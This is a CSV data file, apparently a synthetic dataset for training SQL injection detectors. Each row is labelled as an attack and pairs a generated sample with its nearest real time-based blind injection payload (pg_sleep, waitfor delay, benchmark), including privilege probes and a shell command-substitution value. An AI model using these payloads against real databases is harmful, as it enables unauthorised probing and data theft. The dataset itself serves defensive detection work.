id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000223,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.460170191049643
CTGAN_000224,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,6.561734071678982
CTGAN_000225,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,5.538511913276855
CTGAN_000226,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.930256668803247
CTGAN_000227,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.226943128939097
CTGAN_000228,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.4938336958857565
CTGAN_000229,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.725807008841132
CTGAN_000230,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.09026371115666
CTGAN_000231,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.486615312076778
CTGAN_000232,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.103117173067957
CTGAN_000233,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.64564820800328
CTGAN_000234,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.173574554710293
CTGAN_000235,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.7202235286553185
CTGAN_000236,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.442865925518232
CTGAN_000237,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.342608948553938
CTGAN_000238,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.238005928701359
CTGAN_000239,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,7.537521510202381
CTGAN_000240,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.708315899963258
CTGAN_000241,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.169371970609173
CTGAN_000242,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.739783053775428
CTGAN_000243,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.738244435938139
CTGAN_000244,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.39086887241577
CTGAN_000245,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.121996825337574
CTGAN_000246,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.821518308692355
CTGAN_000247,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,6.022421900464584
CTGAN_000248,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,5.241169375830642
CTGAN_000249,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.501847296612381
CTGAN_000250,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.773034045467744
CTGAN_000251,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.93618384992027
CTGAN_000252,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.413716711526338
CTGAN_000253,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.838112348408897
CTGAN_000254,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.789954444728024
CTGAN_000255,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.048538749911502
CTGAN_000256,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.2910436212650955
CTGAN_000257,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.4119049830677195
CTGAN_000258,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,7.56806840000958
CTGAN_000259,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.492563255924965
CTGAN_000260,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.958754923207861
CTGAN_000261,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.336307724397393
CTGAN_000262,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.0052061845661795
CTGAN_000263,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.089735609522583
CTGAN_000264,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.6703228277529885
CTGAN_000265,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,8.840089908586648
CTGAN_000266,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.190738586119106
CTGAN_000267,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.33239738855426
CTGAN_000268,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.95477472713774
CTGAN_000269,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.371664460147506
CTGAN_000270,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.209898038061524
CTGAN_000271,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.402672244427628
CTGAN_000272,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.296422858637001
CTGAN_000273,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.5960356495354775
CTGAN_000274,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.787533008444915
CTGAN_000275,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.528550104077198
CTGAN_000276,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.256226910600426
CTGAN_000277,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.7493840414617585
CTGAN_000278,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.095204733238813
CTGAN_000279,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.86178635447634
CTGAN_000280,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.606653099831802
CTGAN_000281,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.026608900170158
CTGAN_000282,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.891256388339408
CTGAN_000283,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.378399883909394
CTGAN_000284,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.889563718722961
CTGAN_000285,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.274194779148401
CTGAN_000286,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.7605436104741585
CTGAN_000287,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.200401366524449
CTGAN_000288,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.181499672155631
CTGAN_000289,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.569882361314098
CTGAN_000290,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,9.208381751544822
CTGAN_000291,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,6.838104935288957
CTGAN_000292,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,8.679874919325822
CTGAN_000293,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.290150610960851
CTGAN_000294,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.421226740251376
CTGAN_000295,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.584514430189951
CTGAN_000296,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,4.961547466573744
CTGAN_000297,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.692887160122368
CTGAN_000298,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.452731908996036
CTGAN_000299,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,9.234492499802384
CTGAN_000300,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.580573646187367
CTGAN_000301,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.312247930652946
CTGAN_000302,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.475914157084563
CTGAN_000303,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.9119157701712854
CTGAN_000304,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.761258185843885
CTGAN_000305,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.83558531671267
CTGAN_000306,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.603887046239395
CTGAN_000307,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.733618072330612
CTGAN_000308,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,7.906636794030074
CTGAN_000309,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.767059850206992
CTGAN_000310,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.568554653944844
CTGAN_000311,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.308021383036798
CTGAN_000312,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.8567246380096085
CTGAN_000313,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.871384298933588
CTGAN_000314,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.630381152786658
CTGAN_000315,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,8.20376820355746
CTGAN_000316,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.697187333288324
CTGAN_000317,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.882859404518936
CTGAN_000318,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.251183630736869
CTGAN_000319,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,6.289527889433858
CTGAN_000320,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.462006929541692
CTGAN_000321,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.135723063371062
CTGAN_000322,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.353378862144762
CTGAN_000323,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.95396766502563
CTGAN_000324,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.364885685814905
CTGAN_000325,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.051738209829717
CTGAN_000326,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,8.574276915336434
CTGAN_000327,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.520632450480671
CTGAN_000328,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.22343659154257
CTGAN_000329,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.4521265454498655
CTGAN_000330,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.738523246218099
CTGAN_000331,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.794620904627196
CTGAN_000332,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.742134343700704
CTGAN_000333,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.0847843574112
CTGAN_000334,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.687005373527147
CTGAN_000335,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.219638356075965
CTGAN_000336,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,6.545522778505602
CTGAN_000337,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.9671666033823785
CTGAN_000338,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.91409519591659
CTGAN_000339,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.075635560811312
CTGAN_000340,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.488553117975313
CTGAN_000341,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.2754209881919465
CTGAN_000342,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.65715114619641
CTGAN_000343,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.998317034734199
CTGAN_000344,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.238604117731329
CTGAN_000345,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.948430357392256
CTGAN_000346,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.058182083446779
CTGAN_000347,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.746296779184389
CTGAN_000348,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,8.886143680623622
CTGAN_000349,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.973854519337492
CTGAN_000350,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,7.806907150880829
CTGAN_000351,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,9.238606285627924
CTGAN_000352,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.635300581575998
CTGAN_000353,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.625156496029568
CTGAN_000354,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.555139178165694
CTGAN_000355,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.77216969660699
CTGAN_000356,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.352629195050051
CTGAN_000357,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,4.553447882752751
CTGAN_000358,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.478824652882273
CTGAN_000359,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.49646092961835
CTGAN_000360,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.573493797471993
CTGAN_000361,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,7.2918933742506065
CTGAN_000362,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.410962528892474
CTGAN_000363,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.610939740576405
CTGAN_000364,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.85217135000413
CTGAN_000365,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.55915994368627
CTGAN_000366,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.584906592328742
CTGAN_000367,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.747575973705726
CTGAN_000368,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.704822553014888
CTGAN_000369,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.765159040373186
CTGAN_000370,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.590241181428116
CTGAN_000371,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.991668881802572
CTGAN_000372,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.822215705632814
CTGAN_000373,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.239292014415796
CTGAN_000374,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.087663431443445
CTGAN_000375,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.373372575325818
CTGAN_000376,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.0068690695146545
CTGAN_000377,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,8.15215838428683
CTGAN_000378,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,5.257421243041498
CTGAN_000379,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.248309722806476
CTGAN_000380,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.252366374569946
CTGAN_000381,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,8.132662849166563
CTGAN_000382,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,4.968238374657509
CTGAN_000383,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.918747829852116
CTGAN_000384,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,6.8200953426939055
CTGAN_000385,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.269559333659362
CTGAN_000386,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.930050542055935
CTGAN_000387,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.581511818244076
CTGAN_000388,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,5.628940037121486
CTGAN_000389,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,8.454952316604833
CTGAN_000390,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,8.716550724844234
CTGAN_000391,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.786865218622202
CTGAN_000392,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.19305470385538
CTGAN_000393,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.902770942828897
CTGAN_000394,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,5.889718934152584
CTGAN_000395,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.844613135340186
CTGAN_000396,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.55766410914362
CTGAN_000397,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.714730678999261
CTGAN_000398,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,9.1180392311079
CTGAN_000399,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.590646938730244
CTGAN_000400,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,4.992692210313517
CTGAN_000401,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,5.648059359067984
CTGAN_000402,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.15670844355414
CTGAN_000403,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.956709917931793
CTGAN_000404,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,7.121661195770312
CTGAN_000405,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,5.984594447256099
CTGAN_000406,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.92226179607317
CTGAN_000407,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,7.689873739273928
CTGAN_000408,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.977547090479418
CTGAN_000409,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.889607050116755
CTGAN_000410,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,7.367896852938115
CTGAN_000411,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.9633547014668205
CTGAN_000412,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.396858931587548
CTGAN_000413,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.164140207281044
CTGAN_000414,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.952944621839011
CTGAN_000415,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.82969237238483
CTGAN_000416,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.832466738975999
CTGAN_000417,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,5.432603478927894
CTGAN_000418,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.676148504464957
CTGAN_000419,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.4773224367602875
CTGAN_000420,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.11031490355308
CTGAN_000421,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,6.7183935351293504
CTGAN_000422,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.793115336051759
CTGAN_000423,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,5.08527636553652
CTGAN_000424,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,8.206380435280051
CTGAN_000425,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,4.706058641361892
CTGAN_000426,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,6.798726000413784
CTGAN_000427,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.23116739529122
CTGAN_000428,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.465942170871054
CTGAN_000429,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,6.4082456858429895
CTGAN_000430,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.033410611437045
CTGAN_000431,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.368442826635638
CTGAN_000432,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,6.475891830607957
CTGAN_000433,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.121006244283668
CTGAN_000434,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,6.7686897918904805
CTGAN_000435,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,7.259054300132812
CTGAN_000436,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.679599707682332
CTGAN_000437,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.3888506181692035
CTGAN_000438,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,7.9610251781521555
CTGAN_000439,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,6.215217768210949
CTGAN_000440,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,4.7199749435331295
CTGAN_000441,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,8.697368517799534
CTGAN_000442,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,8.7304403452148
CTGAN_000443,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.910924055884854
